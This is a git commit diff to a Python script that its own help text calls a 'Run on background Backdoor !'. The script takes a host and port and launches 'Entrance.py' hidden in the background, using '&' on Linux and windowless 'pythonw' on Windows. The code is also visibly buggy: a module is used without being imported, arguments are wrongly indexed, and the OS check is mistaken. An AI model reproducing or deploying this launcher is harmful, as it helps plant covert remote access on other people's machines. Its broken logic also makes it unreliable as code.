f7122a1a4e8a0a5684a097f370d6cd60aaa8b9d7
Akh4th <68875577+Akh4th@users.noreply.github.com>
2022-01-19 14:52:44 +0200

    Update Run_On_Background.py

--- Run_On_Background.py
+++ Run_On_Background.py
@@ -1,12 +1,24 @@
-import os
+import os, argparse
 import subprocess as sp
 
 
+p = argparse.ArgumentParser(description="Run on background Backdoor !")
+p.add_argument("--host", help="Host's IP Address to listen with", required=True, type=str)
+p.add_argument("--port", help="Port to listen on", required=True, type=int)
+args = p.parse_args()
+try:
+    host = args.host[0]
+    port = args.port[0]
+    if ipaddress.IPv4Address(host):
+        pass
+except ipaddress.AddressValueError:
+    print("Wrong ip address was given, please try again.")
+
 def running():
     if os.name == "posix":
-        sp.run(["python", "Entrance.py", "&"])
+        sp.run(["python", "Entrance.py", "--host", host, "--port", port, "&"])
     elif os.name == "NT":
-        sp.run(["pythonw", "Entrance.py"])
+        sp.run(["pythonw", "Entrance.py", "--host", host, "--port", port])
 
 
 if __name__ == '__main__':
